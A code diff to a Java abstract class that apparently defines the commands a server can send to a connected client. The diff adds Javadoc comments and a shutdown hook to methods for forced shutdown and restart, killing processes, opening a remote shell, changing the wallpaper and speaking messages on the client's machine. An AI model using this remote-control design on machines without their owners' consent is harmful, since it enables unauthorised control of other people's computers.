@@ -20,7 +20,6 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.Random;
 
-
 /**
  * contains the definitions and some implementations (if they are not OS specific) of the features of the program
  */
@@ -37,16 +36,42 @@ public abstract class CommandSet implements ClipboardOwner
     /** input from the server */
     private DataInputStream inFromServer;
 
+    /** ejects the disk/disk tray on the clients machine */
     public abstract boolean eject();
+    /** forcefully shuts down the clients computer */
     public abstract void shutdown() throws IOException;
+    /** forcefully restarts the clients computer */
     public abstract void restart() throws IOException;
+
+    /** rotates the clients screen orientation
+     * @param direction the way  in which the screen should be rotated (left, right, normal, inverted)
+     */
     public abstract boolean rotate(String direction);
+
+    /** sets the clients desktop wallpaper
+     * @param wallpaper the file to use a the clients new wallpaper
+     */
     public abstract boolean setWallpaper(File wallpaper);
+    /** minimises all open windows on the clients machine */
     public abstract void minimise();
+    /** returns all the running processes on the clients machine */
     public abstract String getRunningProcesses() throws IOException;
+
+    /** kills a process on the clients machine by name
+     * @param processName the process name to terminate
+     */
     public abstract boolean killProcess(String processName); // killing by name will kill all processes with that name
+
+    /** kills a process on the clients machine by pid
+     * @param pid the process id to terminate
+     */
     public abstract boolean killProcess(int pid); // killing by pid will only kill that specified process
+    /** allows for a remote shell session on the clients machine from the server */
     public abstract void remoteShell();
+
+    /** makes the clients machine speak a msg to them
+     * @param message the text to speak
+     */
     public abstract void talk(String message);
 
     public CommandSet(Socket connection)
@@ -57,6 +82,7 @@ public abstract class CommandSet implements ClipboardOwner
             robot = new Robot();
             inFromServer = new DataInputStream(connection.getInputStream());
             outToServer = new DataOutputStream(connection.getOutputStream());
+            runtime.addShutdownHook(new Thread(new ShutdownHook(outToServer)));
         }
         catch(AWTException awte)
         {
@@ -344,8 +370,9 @@ public abstract class CommandSet implements ClipboardOwner
                 }
                 Thread.sleep(delay);
             }
-            catch(InterruptedException ie)
+            catch(InterruptedException ie) // something interrupted the thread sleep
             {
+                ie.printStackTrace();
             }
         }
     }
